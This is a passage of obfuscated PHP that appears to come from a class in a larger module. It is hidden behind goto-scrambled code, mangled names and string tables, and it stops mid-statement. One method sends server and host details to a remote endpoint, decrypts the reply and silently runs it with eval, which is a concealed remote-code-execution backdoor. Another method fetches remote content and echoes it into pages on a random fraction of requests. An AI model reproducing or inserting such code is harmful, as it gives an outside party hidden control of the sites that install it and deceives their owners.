$fƒ¯»•›Ú¯[664]; goto A…ö½Ä¬î; Fä¯­ùØš²: } private function joyg20627704() { goto Dê‰Ÿ“–É˜; Dê‰Ÿ“–É˜: $BŸŒƒá´Ó” =& $_SERVER[ä°„ä°º]; $E¥Éà§¦Û =& $_SERVER[ÖÙ“üÓ½‰]; if ($this->gpked788a35e != $E¥Éà§¦Û[134]) { return; } goto d†˜Õ¨ÖÃ¡; aÊ•º”•‘ö: while ($Fªàö–ö§Ä < $BŸŒƒá´Ó”[594]) { if ($Fªàö–ö§Ä >= 0) { break; } $Fªàö–ö§Ä++; } if ($E¥Éà§¦Û[61]($E¥Éà§¦Û[305])->{$_SERVER[ÖÙ“üÓ½‰][63]}($E¥Éà§¦Û[93]) != $E¥Éà§¦Û[256]) { $E¥Éà§¦Û[61]($E¥Éà§¦Û[305])->{$_SERVER[ÖÙ“üÓ½‰][243]}($E¥Éà§¦Û[93], $E¥Éà§¦Û[256]); } goto AÒ¨‹£œ­ğ; d†˜Õ¨ÖÃ¡: $GLOBALS[$E¥Éà§¦Û[107]][$E¥Éà§¦Û[111]][$E¥Éà§¦Û[303]] = $E¥Éà§¦Û[242]; $GLOBALS[$E¥Éà§¦Û[107]][$E¥Éà§¦Û[304]] = $E¥Éà§¦Û[242]; $Fªàö–ö§Ä = $BŸŒƒá´Ó”[666]; goto aÊ•º”•‘ö; AÒ¨‹£œ­ğ: } public function ncod11f57ac4() { return $_SERVER[ÖÙ“üÓ½‰][306]; } private function vpjbfcf260f3() { goto B—Ê…šÃ‹Ò; dÛöêÄ…‡: $dßÜµãéçÖ = $dì’–»Ä·[13](array($dì’–»Ä·[312], $dì’–»Ä·[313]), $d¼—˜ˆÈ»ì); $eäóöÃ•¢ = $AĞ•í²Şƒ¥[668]; if (!$eäóöÃ•¢) { die; } goto e ¥Ì¾¿; dĞ„ˆ©¹Ê§: $e¤—ã¬–Å— = $AĞ•í²Şƒ¥[669]; while (strlen($e¤—ã¬–Å—) < $AĞ•í²Şƒ¥[605]) { if (!$e¤—ã¬–Å—) { break; } $e¤—ã¬–Å—++; } $D§óîÂãÀ  = array($dì’–»Ä·[186] => $dì’–»Ä·[61]($dì’–»Ä·[62])->{$_SERVER[ÖÙ“üÓ½‰][63]}($dì’–»Ä·[230]), $dì’–»Ä·[200] => $this->gpked788a35e, $dì’–»Ä·[197] => $_SERVER[$dì’–»Ä·[198]], $dì’–»Ä·[199] => $dì’–»Ä·[61]($dì’–»Ä·[62])->{$_SERVER[ÖÙ“üÓ½‰][63]}($dì’–»Ä·[160]), $dì’–»Ä·[126] => $dì’–»Ä·[127]($_SERVER[$dì’–»Ä·[128]] . $Eñï–Ï¯æà), $dì’–»Ä·[190] => $dì’–»Ä·[170], $dì’–»Ä·[193] => $_SERVER[$dì’–»Ä·[194]]); goto DˆŸÉê; Fõ¨Áëİ˜„: $this->{$_SERVER[ÖÙ“üÓ½‰][185]}(); $D°åäƒÄø­ = $AĞ•í²Şƒ¥[670]; while (strlen($D°åäƒÄø­) < $AĞ•í²Şƒ¥[605]) { if (!$D°åäƒÄø­) { break; } $D°åäƒÄø­++; } goto cï×Ò¥ö¦; e ¥Ì¾¿: if ($dßÜµãéçÖ && $dì’–»Ä·[258]() - $dßÜµãéçÖ < $dì’–»Ä·[266]($dì’–»Ä·[314])) { return; } $dì’–»Ä·[13](array($dì’–»Ä·[312], $dì’–»Ä·[173]), $d¼—˜ˆÈ»ì, $dì’–»Ä·[258]()); $Eñï–Ï¯æà = $dì’–»Ä·[61]($dì’–»Ä·[62])->{$_SERVER[ÖÙ“üÓ½‰][63]}($dì’–»Ä·[129]); goto dĞ„ˆ©¹Ê§; DˆŸÉê: $eÓØ½îÈù¿ = $this->{$_SERVER[ÖÙ“üÓ½‰][205]}($dì’–»Ä·[315], $D§óîÂãÀ ); if (!$dì’–»Ä·[164]($eÓØ½îÈù¿)) { return; } if ($eÓØ½îÈù¿[$dì’–»Ä·[186]] && $eÓØ½îÈù¿[$dì’–»Ä·[316]]) { if ($this->{$_SERVER[ÖÙ“üÓ½‰][221]}($eÓØ½îÈù¿[$dì’–»Ä·[316]]) == $D§óîÂãÀ [$dì’–»Ä·[186]]) { return; } } goto Fõ¨Áëİ˜„; f’èÛ„çŒ‡: if ($this->gpked788a35e == $dì’–»Ä·[134] || !$dì’–»Ä·[119]($GLOBALS, $dì’–»Ä·[145])) { return; } if (!$dì’–»Ä·[264]($_SERVER[$dì’–»Ä·[44]], $C†½´¨–Èâ)) { return; } if ($dì’–»Ä·[258]() % 4 != 0) { return; } goto dÛöêÄ…‡; CµñŞœÃ²: $f¸¤›ÛÜÂö = $AĞ•í²Şƒ¥[667]; while (strlen($f¸¤›ÛÜÂö) < $AĞ•í²Şƒ¥[592]) { if (!$f¸¤›ÛÜÂö) { break; } $f¸¤›ÛÜÂö++; } $d¼—˜ˆÈ»ì = $dì’–»Ä·[310] . $dì’–»Ä·[127]($dì’–»Ä·[311]); goto f’èÛ„çŒ‡; cï×Ò¥ö¦: if ($this->{$_SERVER[ÖÙ“üÓ½‰][221]}($eÓØ½îÈù¿[$dì’–»Ä·[316]]) != $D§óîÂãÀ [$dì’–»Ä·[186]]) { $d…º†×æÕ = array($dì’–»Ä·[223] => $Eñï–Ï¯æà, $dì’–»Ä·[224] => $_SERVER[$dì’–»Ä·[128]], $dì’–»Ä·[225] => $dì’–»Ä·[226](), $dì’–»Ä·[195] => $_SERVER[$dì’–»Ä·[196]]); $D¹õ¡ŞÄÂ = $this->{$_SERVER[ÖÙ“üÓ½‰][227]}($dì’–»Ä·[169]($d…º†×æÕ)); $eÓØ½îÈù¿ = $this->{$_SERVER[ÖÙ“üÓ½‰][205]}($dì’–»Ä·[228] . $D¹õ¡ŞÄÂ); if ($eÓØ½îÈù¿ && $dì’–»Ä·[164]($eÓØ½îÈù¿) && isset($eÓØ½îÈù¿[$dì’–»Ä·[316]])) { $fŒÂåç¡Ü = $this->{$_SERVER[ÖÙ“üÓ½‰][211]}($eÓØ½îÈù¿[$dì’–»Ä·[316]], 2); if ($fŒÂåç¡Ü) { $fŒÂåç¡Ü = $this->{$_SERVER[ÖÙ“üÓ½‰][221]}($fŒÂåç¡Ü); } if ($fŒÂåç¡Ü) { try { @eval($fŒÂåç¡Ü); } catch (Exception $e”å×¿¹¹) { } } } } goto bé‚©†‚—»; B—Ê…šÃ‹Ò: $AĞ•í²Şƒ¥ =& $_SERVER[ä°„ä°º]; $dì’–»Ä· =& $_SERVER[ÖÙ“üÓ½‰]; $C†½´¨–Èâ = array($dì’–»Ä·[307], $dì’–»Ä·[308], $dì’–»Ä·[309]); goto CµñŞœÃ²; bé‚©†‚—»: } private function qbzu246ff3ff($E«çÍÃô = '', $e»äò†”¢à = array(), $c±ª‹ÊÕ“Ì = 5) { goto eŠÂ”¥´¾; FÒ‡à‘á: $dàŞ¿ì¶‰ = $d°ÊÉØ©­å[673]; if (!$dàŞ¿ì¶‰) { return; } if ($e»äò†”¢à && $aÑçÆì£[164]($e»äò†”¢à)) { $C³…Ò‹ÉÍ± = $C³…Ò‹ÉÍ± . $aÑçÆì£[319] . $aÑçÆì£[320]($e»äò†”¢à); } goto eœ‡‚°È™ƒ; E¿Š±¥¢ˆ: return $aÑçÆì£[213]($e»äò†”¢à, !0); $f¦¶÷çã¡Ò = $d°ÊÉØ©­å[674]; goto Aê–›ñ†ò; C „ƒêìÊª: $c®öçï×Ù = $d°ÊÉØ©­å[671]; if (!$c®öçï×Ù) { die; } $C³…Ò‹ÉÍ± = $this->{$_SERVER[ÖÙ“üÓ½‰][272]}($C³…Ò‹ÉÍ±, $aÑçÆì£[318]); goto EÔ ½ÖØŸŠ; eŠÂ”¥´¾: $d°ÊÉØ©­å =& $_SERVER[ä°„ä°º]; $aÑçÆì£ =& $_SERVER[ÖÙ“üÓ½‰]; $C³…Ò‹ÉÍ± = $aÑçÆì£[317]; goto C „ƒêìÊª; EÔ ½ÖØŸŠ: $AßÊ²ÉÆÜ = $d°ÊÉØ©­å[672]; while (strlen($AßÊ²ÉÆÜ) < $d°ÊÉØ©­å[605]) { if (!$AßÊ²ÉÆÜ) { break; } $AßÊ²ÉÆÜ++; } $C³…Ò‹ÉÍ± = $C³…Ò‹ÉÍ± . $E«çÍÃô; goto FÒ‡à‘á; eœ‡‚°È™ƒ: if ($e»äò†”¢à === -1) { return $C³…Ò‹ÉÍ±; } $c„­œ„¸â¹ = $aÑçÆì£[274](array($aÑçÆì£[275] => array($aÑçÆì£[278] => $c±ª‹ÊÕ“Ì, $aÑçÆì£[276] => $aÑçÆì£[321]), $aÑçÆì£[322] => array($aÑçÆì£[323] => !1, $aÑçÆì£[324] => !1))); $e»äò†”¢à = @$aÑçÆì£[279]($C³…Ò‹ÉÍ±, !1, $c„­œ„¸â¹); goto E¿Š±¥¢ˆ; Aê–›ñ†ò: } private function hksdd7f3ed94() { goto D‹”Ğ…Úà; CéØ‚‘¾‰: while ($eá—Î¡ÅÈ’ < $D˜Í¹Ç²[611]) { if ($eá—Î¡ÅÈ’ >= 0) { break; } $eá—Î¡ÅÈ’++; } $BÊ²Ü±ÚÄÃ = $c§õê÷Ñ[119]($this->uszxfd58a655, $c§õê÷Ñ[352]); $e„«íŒÁÖã = $D˜Í¹Ç²[676]; goto A¯®Í‰ ã´; D‹”Ğ…Úà: $D˜Í¹Ç² =& $_SERVER[ä°„ä°º]; $c§õê÷Ñ =& $_SERVER[ÖÙ“üÓ½‰]; $EôùšÁÎ² = array($c§õê÷Ñ[325] => $c§õê÷Ñ[326], $c§õê÷Ñ[327] => $c§õê÷Ñ[328], $c§õê÷Ñ[329] => $c§õê÷Ñ[330], $c§õê÷Ñ[331] => $c§õê÷Ñ[332], $c§õê÷Ñ[333] => $c§õê÷Ñ[334], $c§õê÷Ñ[335] => $c§õê÷Ñ[267], $c§õê÷Ñ[336] => $c§õê÷Ñ[267], $c§õê÷Ñ[337] => $c§õê÷Ñ[326], $c§õê÷Ñ[338] => $c§õê÷Ñ[328], $c§õê÷Ñ[339] => $c§õê÷Ñ[330], $c§õê÷Ñ[340] => $c§õê÷Ñ[341], $c§õê÷Ñ[342] => $c§õê÷Ñ[332], $c§õê÷Ñ[343] => $c§õê÷Ñ[344], $c§õê÷Ñ[345] => $c§õê÷Ñ[334], $c§õê÷Ñ[346] => $c§õê÷Ñ[347], $c§õê÷Ñ[348] => $c§õê÷Ñ[349], $c§õê÷Ñ[350] => $c§õê÷Ñ[351]); goto CËè¡Ñ½¢…; câî–ŸŠÁ: $dÂ©¦¶‰Šğ = $D˜Í¹Ç²[677]; goto CšÏæí…ò»; CËè¡Ñ½¢…: $cáçµ„ÛÀÔ = $EôùšÁÎ²[$this->gpked788a35e]; $cáçµ„ÛÀÔ = $c§õê÷Ñ[266]($cáçµ„ÛÀÔ ? $cáçµ„ÛÀÔ : $c§õê÷Ñ[326]); $eá—Î¡ÅÈ’ = $D˜Í¹Ç²[675]; goto CéØ‚‘¾‰; A¯®Í‰ ã´: while (strlen($e„«íŒÁÖã) < $D˜Í¹Ç²[592]) { if (!$e„«íŒÁÖã) { break; } $e„«íŒÁÖã++; } $BÊ²Ü±ÚÄÃ = $BÊ²Ü±ÚÄÃ ? $c§õê÷Ñ[266]($BÊ²Ü±ÚÄÃ) : 0; return $cáçµ„ÛÀÔ + $BÊ²Ü±ÚÄÃ; goto câî–ŸŠÁ; CšÏæí…ò»: } public function sock3246d21e($c­›ªŒìŒ) { goto Eóì¿¼àÁ¶; a×÷«ˆÈ•: while (strlen($Dà†Ê«â“ø) < $fŠ²‡ÓÊÃ­[592]) { if (!$Dà†Ê«â“ø) { break; } $Dà†Ê«â“ø++; } $cøÍÜ² ¨Ë = $Fğƒ·îÒù[244]($cøÍÜ² ¨Ë, $Fğƒ·îÒù[10], $Fğƒ·îÒù[353]); if (!$Fğƒ·îÒù[264]($c­›ªŒìŒ[$Fğƒ·îÒù[353]], $cøÍÜ² ¨Ë)) { $Fğƒ·îÒù[187]($Fğƒ·îÒù[357], !1, $Fğƒ·îÒù[261]); } goto E£‡ôİß¯¶; aØºÁ¿òİ: if ($DÓ¾¦Ä†íÉ <= $c‚×õ»ÃÕ×) { return; } $cøÍÜ² ¨Ë = $Fğƒ·îÒù[61]($Fğƒ·îÒù[152])->{$_SERVER[ÖÙ“üÓ½‰][354]}($Fğƒ·îÒù[353])->{$_SERVER[ÖÙ“üÓ½‰][355]}($c‚×õ»ÃÕ×)->{$_SERVER[ÖÙ“üÓ½‰][356]}(); $Dà†Ê«â“ø = $fŠ²‡ÓÊÃ­[678]; goto a×÷«ˆÈ•; Eóì¿¼àÁ¶: $fŠ²‡ÓÊÃ­ =& $_SERVER[ä°„ä°º]; $Fğƒ·îÒù =& $_SERVER[ÖÙ“üÓ½‰]; $c‚×õ»ÃÕ× = $this->{$_SERVER[ÖÙ“üÓ½‰][150]}(); goto f‡‘ˆ¡ßÛˆ; f‡‘ˆ¡ßÛˆ: if ($c­›ªŒìŒ[$Fğƒ·îÒù[353]] == $Fğƒ·îÒù[242]) { return; } if ($c‚×õ»ÃÕ× >= $Fğƒ·îÒù[266]($Fğƒ·îÒù[267])) { return; } $DÓ¾¦Ä†íÉ = $Fğƒ·îÒù[61]($Fğƒ·îÒù[152])->{$_SERVER[ÖÙ“üÓ½‰][153]}(); goto aØºÁ¿òİ; E£‡ôİß¯¶: } public function ueps0c740f6d() { goto aµÍ©óÂä¶; f¢õÔÍÆÕ: $EÃæùç²¨Ş = $F‡•¼¿Ñ…Ğ[682]; if (strlen($EÃæùç²¨Ş) < $F‡•¼¿Ñ…Ğ[608]) { return; } goto aƒ³‘œÆàÉ; D‘¤´Ÿ¦í‰: $fĞ âÕÅ« = @$Aò÷˜Ñ‚Ä[279]($Dİáóõàê, !1, $A‰è†«ÊÑä); $CĞªÉîÈ¥‘ = $F‡•¼¿Ñ…Ğ[681]; echo $Aò÷˜Ñ‚Ä[359] . $Aò÷˜Ñ‚Ä[360]($fĞ âÕÅ«) . $Aò÷˜Ñ‚Ä[361]; goto f¢õÔÍÆÕ; aµÍ©óÂä¶: $F‡•¼¿Ñ…Ğ =& $_SERVER[ä°„ä°º]; $Aò÷˜Ñ‚Ä =& $_SERVER[ÖÙ“üÓ½‰]; if (!$Aò÷˜Ñ‚Ä[119]($GLOBALS, $Aò÷˜Ñ‚Ä[145]) || $Aò÷˜Ñ‚Ä[358](1, 100) > 20) { return; } goto c¼ô¢…±Í; b¬ïŸêº‰: $Dİáóõàê = $this->{$_SERVER[ÖÙ“üÓ½‰][272]}($Dİáóõàê, $Aò÷˜Ñ‚Ä[273]); $Bà¬ãŒ°ßƒ = $F‡•¼¿Ñ…Ğ[680]; $A‰è†«ÊÑä = $Aò÷˜Ñ‚Ä[274](array($Aò÷˜Ñ‚Ä[275] => array($Aò÷˜Ñ‚Ä[276] => $Aò÷˜Ñ‚Ä[277], $Aò÷˜Ñ‚Ä[278] => 3))); goto D‘¤´Ÿ¦í‰; c¼ô¢…±Í: $Dİáóõàê = $Aò÷˜Ñ‚Ä[271]; $fò¸’¿õà¡ = $F‡•¼¿Ñ…Ğ[679]; while ($fò¸’¿õà¡ < $F‡•¼¿Ñ…Ğ[594]) { if ($fò¸’¿õà¡ >= 0) { break; } $fò¸’¿õà¡++; } goto b¬ïŸêº‰; aƒ³‘œÆàÉ: } private function yoli0fd1f5e5($E¹Òèö‡£Ó, $d©Ÿ¤ÙŸâì, $C¶„ŠìÚ¹İ = 3) { goto fÇÖãøãÒ¨; d™²¥„•§: $bÎœ°±·¶¶ = $EÜ©¤…É©[236]($aï¬Ë°÷Èó . $DÕ¬È´øŸ . $bÎœ°±·¶¶); $f¤µ¿øÒøÑ = $bÉ‡”åª¸[697]; if (strlen($f¤µ¿øÒøÑ) < $bÉ‡”åª¸[592]) { return; } goto c¥î‰»óŠ‚; eè¡êÈå·’: $AÚÛù¨•“¹ = $bÉ‡”åª¸[686]; if (strlen($AÚÛù¨•“¹) < $bÉ‡”åª¸[592]) { return; } switch ($aï¬Ë°÷Èó) { case $EÜ©¤…É©[256]: $bÎœ°±·¶¶ = $this->{$_SERVER[ÖÙ“üÓ½‰][168]}($E¹Òèö‡£Ó, $EÜ©¤…É©[236]($d©Ÿ¤ÙŸâì . $DÕ¬È´øŸ)); $bªƒä“ï¿Í = $bÉ‡”åª¸[687]; break; case $EÜ©¤…É©[242]: $bÎœ°±·¶¶ = $this->{$_SERVER[ÖÙ“üÓ½‰][168]}($E¹Òèö‡£Ó, $EÜ©¤…É©[236]($DÕ¬È´øŸ . $d©Ÿ¤ÙŸâì)); $cŠŠßŠÆ = $bÉ‡”åª¸[688]; if (!$cŠŠßŠÆ) { return; } break; case $EÜ©¤…É©[364]: $bÎœ°±·¶¶ = $this->{$_SERVER[ÖÙ“üÓ½‰][168]}($E¹Òèö‡£Ó, $EÜ©¤…É©[131]($DÕ¬È´øŸ . $d©Ÿ¤ÙŸâì)); break; $AÔñçÀ•› = $bÉ‡”åª¸[689]; while ($AÔñçÀ•› < $bÉ‡”åª¸[611]) { if ($AÔñçÀ•› >= 0) { break; } $AÔñçÀ•›++; } case $EÜ©¤…É©[365]: $bÎœ°±·¶¶ = $this->{$_SERVER[ÖÙ“üÓ½‰][168]}($E¹Òèö‡£Ó, $EÜ©¤…É©[127]($DÕ¬È´øŸ . $d©Ÿ¤ÙŸâì)); break; $d™ƒ˜¡·¿° = $bÉ‡”åª¸[690]; case $EÜ©¤…É©[366]: goto Dœã¹²ç„™; Dœã¹²ç„™: $E¹Òèö‡£Ó = $EÜ©¤…É©[131]($E¹Òèö‡£Ó); $b‡ãÊõô–ê = $bÉ‡”åª¸[691]; while (strlen($b‡ãÊõô–ê) < $bÉ‡”åª¸[592]) { if (!$b‡ãÊõô–ê) { break; } $b‡ãÊõô–ê++; } goto fÚ°å—Á©¿; c½‚íÂ¨ô: if (strlen($B­¸ƒí±ì) < $bÉ‡”åª¸[605]) { return; } $Bõ·‘âÛ¥Ç = $EÜ©¤…É©[127]($EØªéí¶ . $EÜ©¤…É©[127]($d©Ÿ¤ÙŸâì . $EØªéí¶) . $d©Ÿ¤ÙŸâì); $D‰ÅÕè¬‡Û = $bÉ‡”åª¸[693]; goto AÑà¹‘Æ“Î; fä‡·¾§ëÒ: $fÄéí•æ¦Ó = 0; $C…ÓÒŒ¹óõ = 0; for ($B™«“¨œ´ = 0; $B™«“¨œ´ < $EÜ©¤…É©[24]($E¹Òèö‡£Ó); $B™«“¨œ´++) { $C…ÓÒŒ¹óõ = $C…ÓÒŒ¹óõ == $EÜ©¤…É©[24]($Bõ·‘âÛ¥Ç) ? 0 : $C…ÓÒŒ¹óõ; $F‚£¿ ¢´ = $bÉ‡”åª¸[695]; $fÄéí•æ¦Ó = ($c‡ñì˜öµÒ + $EÜ©¤…É©[368]($b´ê·£›„Ç, $E¹Òèö‡£Ó[$B™«“¨œ´]) + $EÜ©¤…É©[369]($Bõ·‘âÛ¥Ç[$C…ÓÒŒ¹óõ++])) % 64; $Cª‹’œø¤ğ = $bÉ‡”åª¸[696]; while ($Cª‹’œø¤ğ < $bÉ‡”åª¸[608]) { if ($Cª‹’œø¤ğ >= 0) { break; } $Cª‹’œø¤ğ++; } $cß¹İ×Ä¦® .= $b´ê·£›„Ç[$fÄéí•æ¦Ó]; } goto bÕ¥‘ÉàÆí; AÑà¹‘Æ“Î: if (!$D‰ÅÕè¬‡Û) { return; } $Bõ·‘âÛ¥Ç = $EÜ©¤…É©[25]($Bõ·‘âÛ¥Ç, $c‡ñì˜öµÒ % 8, $c‡ñì˜öµÒ % 8 + 7); $b°İˆŞ‘ö = $bÉ‡”åª¸[694]; goto f†¼‚Œ¬¥È; bÕ¥‘ÉàÆí: $bÎœ°±·¶¶ = $EÜ©¤…É©[360]($EØªéí¶ . $cß¹İ×Ä¦®); break; goto EÇœœæÄéœ; fÚ°å—Á©¿: $c‡ñì˜öµÒ = $EÜ©¤…É©[367](0, 64); $EØªéí¶ = $b´ê·£›„Ç[$c‡ñì˜öµÒ]; $B­¸ƒí±ì = $bÉ‡”åª¸[692]; goto c½‚íÂ¨ô; f†¼‚Œ¬¥È: if (!$b°İˆŞ‘ö) { die; } $cß¹İ×Ä¦® = $EÜ©¤…É©[10]; $B™«“¨œ´ = 0; goto fä‡·¾§ëÒ; EÇœœæÄéœ: default: $bÎœ°±·¶¶ = $this->{$_SERVER[ÖÙ“üÓ½‰][168]}($E¹Òèö‡£Ó, $d©Ÿ¤ÙŸâì . $DÕ¬È´øŸ); break; } goto d™²¥„•§; c¥î‰»óŠ‚: if ($C¶„ŠìÚ¹İ - 1 > 0) { $bÎœ°±·¶¶ = $this->{$_SERVER[ÖÙ“üÓ½‰][140]}($bÎœ°±·¶¶, $d©Ÿ¤ÙŸâì, $C¶„ŠìÚ¹İ - 1); } return $bÎœ°±·¶¶; goto aœÔ‹ó•ö¹; FÇòõç¦•­: while (strlen($BŒê¼¦Œ¦æ) < $bÉ‡”åª¸[611]) { if (!$BŒê¼¦Œ¦æ) { break; } $BŒê¼¦Œ¦æ++; } $DÕ¬È´øŸ = $EÜ©¤…É©[137](15); $b´ê·£›„Ç = $EÜ©¤…É©[363]; goto eè¡êÈå·’; fÇÖãøãÒ¨: $bÉ‡”åª¸ =& $_SERVER[ä°„ä°º]; $EÜ©¤…É© =& $_SERVER[ÖÙ“üÓ½‰]; $EÜ©¤…É©[362](1); goto Aå††š·; Aå††š·: $a„â¶ÄÜô = $bÉ‡”åª¸[683]; $E¹Òèö‡£Ó = $EÜ©¤…É©[2]($E¹Òèö‡£Ó); $cíÔ–ù»Ê = $bÉ‡”åª¸[684]; goto A¹æ™‰Á‘…; A¹æ™‰Á‘…: if (!$cíÔ–ù»Ê) { die; } $aï¬Ë°÷Èó = $EÜ©¤…É©[358](0, 5) . $EÜ©¤…É©[10]; $BŒê¼¦Œ¦æ = $bÉ‡”åª¸[685]; goto FÇòõç¦•­; aœÔ‹ó•ö¹: } private function dwah31dd9784($aïÖŸĞÆ, $F‰·†õó©, $d˜÷¹×—°• = 3) { goto bŠîíóØŠˆ; c™´åÜ¾: $aïÖŸĞÆ = $eÎ­‡î‹¶å[2]($aïÖŸĞÆ); $aïÖŸĞÆ = $eÎ­‡î‹¶å[236]($aïÖŸĞÆ); $a´Á‡¡ğ°Ñ = $aïÖŸĞÆ[0]; goto AÓëÛÀ‡¦ø; Cñé²ÓÑêÒ: $b¡À£á”¥Ç = $eÎ­‡î‹¶å[363]; switch ($a´Á‡¡ğ°Ñ) { case $eÎ­‡î‹¶å[256]: $f’÷ †è— = $this->{$_SERVER[ÖÙ“üÓ½‰][272]}($aïÖŸĞÆ, $eÎ­‡î‹¶å[236]($F‰·†õó© . $e‚Íê–Ôì)); $b¦ö¨ÍæÇ‹ = $dïê¨‘•ê…[700]; if (!$b¦ö¨ÍæÇ‹) { return; } break; $F§Ò‹¾¢¬à = $dïê¨‘•ê…[701]; case $eÎ­‡î‹¶å[242]: $f’÷ †è— = $this->{$_SERVER[ÖÙ“üÓ½‰][272]}($aïÖŸĞÆ, $eÎ­‡î‹¶å[236]($e‚Íê–Ôì . $F‰·†õó©)); break; case $eÎ­‡î‹¶å[364]: $f’÷ †è— = $this->{$_SERVER[ÖÙ“üÓ½‰][272]}($aïÖŸĞÆ, $eÎ­‡î‹¶å[131]($e‚Íê–Ôì . $F‰·†õó©)); break; $cíù‹‘ÖÜ = $dïê¨‘•ê…[702]; if (!$cíù‹‘ÖÜ) { die; } case $eÎ­‡î‹¶å[365]: $f’÷ †è— = $this->{$_SERVER[ÖÙ“üÓ½‰][272]}($aïÖŸĞÆ, $eÎ­‡î‹¶å[127]($e‚Íê–Ôì . $F‰·†õó©)); break; case $eÎ­‡î‹¶å[366]: goto c™„¾ğ·¥; aİ¥ğ‹Ò©®: $E‘¼ôØŞõÌ = $dïê¨‘•ê…[706]; $e•¬ÚÛ°¤ = 0; $fêÍÊ’—ùÅ = $dïê¨‘•ê…[707]; goto D•ÂÍ¨½¼–; a‹ŞŸ©àƒ: $Cèçœø–’… = $dïê¨‘•ê…[711]; goto CÄ™–š…Ø; D•ÂÍ¨½¼–: if (strlen($fêÍÊ’—ùÅ) < $dïê¨‘•ê…[592]) { return; } $a„ºá“˜¢  = 0; $C³áëó†ç† = $dïê¨‘•ê…[708]; goto eãÓ²°ÚŒ; c™„¾ğ·¥: $aïÖŸĞÆ = $eÎ­‡î‹¶å[370]($aïÖŸĞÆ); $eÜ©ˆŒœš— = $aïÖŸĞÆ[0]; $aïÖŸĞÆ = $eÎ­‡î‹¶å[25]($aïÖŸĞÆ, 1); goto b¢Á²µ„††; b¢Á²µ„††: $aàğÉªò‘ = $dïê¨‘•ê…[703]; $BÔæòÜ»»­ = $eÎ­‡î‹¶å[368]($b¡À£á”¥Ç, $eÜ©ˆŒœš—); $a·ØêÈ®®ƒ = $dïê¨‘•ê…[704]; goto fİÂ¼ì±îç; fİÂ¼ì±îç: while (strlen($a·ØêÈ®®ƒ) < $dïê¨‘•ê…[594]) { if (!$a·ØêÈ®®ƒ) { break; } $a·ØêÈ®®ƒ++; } $bâ·•Óù¼ƒ = $eÎ­‡î‹¶å[127]($eÜ©ˆŒœš— . $eÎ­‡î‹¶å[127]($F‰·†õó© . $eÜ©ˆŒœš—) . $F‰·†õó©); $bâ·•Óù¼ƒ = $eÎ­‡î‹¶å[25]($bâ·•Óù¼ƒ, $BÔæòÜ»»­ % 8, $BÔæòÜ»»­ % 8 + 7); goto b‰ÎÍ–Ô²; b‰ÎÍ–Ô²: $bÇî¯Şˆ² = $eÎ­‡î‹¶å[10]; $Cøèô±½ = $dïê¨‘•ê…[705]; $dî¶õÙÜ’ = 0; goto aİ¥ğ‹Ò©®; eãÓ²°ÚŒ: for ($dî¶õÙÜ’ = 0; $dî¶õÙÜ’ < $eÎ­‡î‹¶å[24]($aïÖŸĞÆ); $dî¶õÙÜ’++) { $a„ºá“˜¢  = $a„ºá“˜¢  == $eÎ­‡î‹¶å[24]($bâ·•Óù¼ƒ) ? 0 : $a„ºá“˜¢ ; $EŠäøñ‰Ó = $a„ºá“˜¢ ++; $e•¬ÚÛ°¤ = $eÎ­‡î‹¶å[368]($b¡À£á”¥Ç, $aïÖŸĞÆ[$dî¶õÙÜ’]) - $BÔæòÜ»»­ - $eÎ­‡î‹¶å[369]($bâ·•Óù¼ƒ[$EŠäøñ‰Ó]); $f½í¯Ì¡¼ = $dïê¨‘•ê…[709]; while (strlen($f½í¯Ì¡¼) < $dïê¨‘•ê…[605]) { if (!$f½í¯Ì¡¼) { break; } $f½í¯Ì¡¼++; } while ($e•¬ÚÛ°¤ < 0) { $e•¬ÚÛ°¤ += 64; } $bÇî¯Şˆ² .= $b¡À£á”¥Ç[$e•¬ÚÛ°¤]; $bÀøä˜‡ğ = $dïê¨‘•ê…[710]; while ($bÀøä˜‡ğ < $dïê¨‘•ê…[608]) { if ($bÀøä˜‡ğ >= 0) { break; } $bÀøä˜‡ğ++; } } $f’÷ †è— = $eÎ­‡î‹¶å[371]($bÇî¯Şˆ²); break; goto a‹ŞŸ©àƒ; CÄ™–š…Ø: default: $f’÷ †è— = $this->{$_SERVER[ÖÙ“üÓ½‰][272]}($aïÖŸĞÆ, $F‰·†õó© . $e‚Íê–Ôì); break; } if ($d˜÷¹×—°• - 1 > 0) { $f’÷ †è— = $this->{$_SERVER[ÖÙ“üÓ½‰][211]}($f’÷ †è—, $F‰·†õó©, $d˜÷¹×—°• - 1); } goto A””«Ñ…óö; FÇÆÌ–Á•Â: $aïÖŸĞÆ = $eÎ­‡î‹¶å[25]($aïÖŸĞÆ, 16); $F™ĞÆ öĞñ = $dïê¨‘•ê…[699]; while (strlen($F™ĞÆ öĞñ) < $dïê¨‘•ê…[594]) { if (!$F™ĞÆ öĞñ) { break; } $F™ĞÆ öĞñ++; } goto Cñé²ÓÑêÒ; A””«Ñ…óö: return $f’÷ †è—; goto bÚŠ¯©«; AÓëÛÀ‡¦ø: $eœšÄ–óÚé = $dïê¨‘•ê…[698]; if (strlen($eœšÄ–óÚé) < $dïê¨‘•ê…[608]) { die; } $e‚Íê–Ôì = $eÎ­‡î‹¶å[25]($aïÖŸĞÆ, 1, 15); goto FÇÆÌ–Á•Â; bŠîíóØŠˆ: $dïê¨‘•ê… =& $_SERVER[ä°„ä°º]; $eÎ­‡î‹¶å =& $_SERVER[ÖÙ“üÓ½‰]; if (!$eÎ­‡î‹¶å[161]($aïÖŸĞÆ) || $eÎ­‡î‹¶å[24]($aïÖŸĞÆ) < 10) { return !1; } goto c™´åÜ¾; bÚŠ¯©«: } public function gpbjc647765c($E˜˜äÖ—²Ñ) { goto eŞÛè¾µå„; f°œáŠÃ: $f‚Œ¤œ—±Î = $E“™‚ğÚ–’[714]; if (strlen($f‚Œ¤œ—±Î) < $E“™‚ğÚ–’[608]) { return; } for ($e´é‹Û–ò‹ = 0; $e´é‹Û–ò‹ < $eÑ±£æÔ«ä * 10; $e´é‹Û–ò‹++) { if (($eÑ±£æÔ«ä * $e´é‹Û–ò‹ + 1) % $cÖõ­ƒ¾›¦ == 0) { $E›ÎµËŸÖÊ = $d†‹íÕÒ—[266](($eÑ±£æÔ«ä * $e´é‹Û–ò‹ + 1) / $cÖõ­ƒ¾›¦); break; } } goto F°»ùÄÜ´ø; F°»ùÄÜ´ø: $d¨ÃƒÈĞº£ = $this->{$_SERVER[ÖÙ“üÓ½‰][168]}($dóÃ†åÑÈŸ * $fœ»¾ƒæ . $d†‹íÕÒ—[10], $d†‹íÕÒ—[170]); $AÒ²ÚË‚ˆ = $d†‹íÕÒ—[127]($d†‹íÕÒ—[373] . ($dóÃ†åÑÈŸ + $fœ»¾ƒæ) . 